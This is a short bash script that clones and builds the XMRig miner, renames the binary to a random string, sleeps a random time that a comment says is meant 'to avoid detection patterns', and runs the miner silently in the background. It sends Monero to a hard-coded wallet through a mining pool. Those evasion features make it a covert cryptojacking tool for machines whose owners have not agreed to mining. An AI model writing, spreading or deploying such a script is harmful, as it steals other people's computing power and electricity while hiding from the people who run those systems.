#!/bin/bash

### BASIC CONFIG ###
COIN="XMR"
ADDRESS="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
WORKER_ID="worker-$(hostname | tr -dc a-z0-9)"
WALLET="$COIN:$ADDRESS.$WORKER_ID"
POOL="rx.unmineable.com:3333"
THREADS=16
RAND_NAME=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)

### RANDOM DELAY TO AVOID DETECTION PATTERNS ###
DELAY=$((RANDOM % 30 + 15))  # 15 to 44 seconds
echo "[*] Sleeping $DELAY seconds..."
sleep $DELAY

### FUNCTION TO DOWNLOAD AND COMPILE XMRIG ###
setup_miner() {
    echo "[*] Installing dependencies..."
    sudo apt-get update -y >/dev/null 2>&1
    sudo apt-get install -y git cmake build-essential libssl-dev libhwloc-dev libuv1-dev >/dev/null 2>&1

    echo "[*] Cloning xmrig source..."
    git clone https://github.com/xmrig/xmrig.git >/dev/null 2>&1

    mkdir -p xmrig/build && cd xmrig/build
    echo "[*] Building miner..."
    cmake .. >/dev/null 2>&1
    make -j$(nproc) >/dev/null 2>&1

    cd ../..
    mv xmrig/build/xmrig ./$RAND_NAME
    chmod +x ./$RAND_NAME
}

### CHECK & INSTALL ###
if [ ! -f "./$RAND_NAME" ]; then
    setup_miner
fi

### RUN THE MINER IN BACKGROUND ###
echo "[*] Launching mining process..."
nohup ./$RAND_NAME -o $POOL -u $WALLET -p x -k --tls -t $THREADS --donate-level 1 >/dev/null 2>&1 &

echo "[+] Mining started under name '$RAND_NAME'."
